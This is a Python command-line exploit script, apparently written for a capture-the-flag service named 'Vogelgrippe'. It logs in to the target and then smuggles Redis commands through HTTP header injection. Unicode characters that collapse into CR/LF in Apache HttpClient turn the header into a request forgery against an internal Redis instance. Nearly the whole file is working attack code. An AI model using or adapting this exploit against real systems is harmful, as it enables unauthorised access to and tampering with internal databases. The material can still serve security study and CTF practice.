import pickle

import click
import requests


@click.group()
def cli():
    pass


@cli.command()
@click.option('--redis-host',
              default='localhost:6379',
              help='Redis hostname/ip')
@click.option('--target',
              prompt='Vogelgrippe target',
              default='localhost:3000',
              help='The host and port where Vogelgrippe frontend runs (depending on your exploit choice)')
# @click.option('--use-frontend/--no-frontend', default=True,
#               help='Chooses between using the frontend or the proxy-service directly')
@click.argument('payload_file')
def redis(redis_host, target, payload_file):
    """Tries to send a query to the running redis instance through header injection."""
    click.echo('Exploiting redis (running on %s) through Vogelgrippe (running on %s) ' % (redis_host, target))
    session = requests.session();
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return

    click.echo(session.cookies.get('username'))
    raw_payload = open(payload_file, "r").read()

    click.echo('Sending following redis commands (from %s):\n%s' % (payload_file, raw_payload))

    payload = prepare_injected_payload(raw_payload)
    frontend_payload = {'header': payload.encode("utf-8"), 'urlmessage': "http://" + redis_host}

    click.echo('Sending payload: %s!' % payload)
    r = session.post(f'http://{target}/post', data=frontend_payload, allow_redirects=False)

    click.echo('Request returned status code %s.' % str(r.status_code))
    if r.status_code == 302:
        click.echo('Exploit done.')
    pass


@cli.command()
@click.argument('username')
@click.option('--target',
              prompt='Vogelgrippe frontend',
              default='localhost:3000',
              help='The host and port where Vogelgrippe frontend runs')
def login(username, target):
    """Logs the user in with the specified username. If it doesn't exist it will register it and then login."""
    click.echo('Logging in with %s ' % username)
    session = requests.session()

    user_data = {'username': username}
    r = session.post(f'http://{target}/register', data=user_data)
    click.echo('Register returned status code %s.' % str(r.status_code))
    response = session.post(f'http://{target}/login',
                            data=user_data,
                            allow_redirects=False)
    if response.history:
        print("Request was redirected")
        for resp in response.history:
            print(resp.status_code, resp.url)
        print("Final destination:")
        print(response.status_code, response.url)
    else:
        print("Request was not redirected")

    click.echo('Login returned response:\n %s.' % response.text)
    click.echo(session.cookies.get_dict())
    with open('cookies.dump', 'wb') as f:
        pickle.dump(session.cookies, f)


def prepare_injected_payload(payload: str):
    """Prepares redis payloads to be send via HTTP header injection in Apache HTTPClient"""
    newline = '嘍嘊'
    header_value = '1' + newline  # 1 is the value of the header we control and then we inject a newline
    payload = payload.replace('\n', newline)  # prepare redis payload

    return header_value + payload


def logged_in(session):
    try:
        with open('cookies.dump', 'rb') as f:
            session.cookies.update(pickle.load(f))
            if session.cookies.get('username'):
                return True
            return False
    except:
        return False
